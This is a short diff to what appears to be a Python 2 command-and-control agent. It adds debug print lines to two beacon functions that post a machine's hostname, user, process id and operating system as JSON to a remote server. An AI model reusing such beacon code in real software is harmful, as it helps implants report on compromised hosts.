@@ -56,6 +56,7 @@ def initial_beacon(hostname, current_user, process_id, operating_system):
         request.add_header("Content-Type", "application/json")
         f = urllib2.urlopen(request)
         response = f.read()
+        print response
         return response
 
     except:
@@ -76,6 +77,7 @@ def rc4_beacon(key, hostname, current_user, process_id, operating_system):
         request.add_header("Content-Type", "application/json")
         f = urllib2.urlopen(request)
         response = f.read()
+        print response
         return response
 
     except:
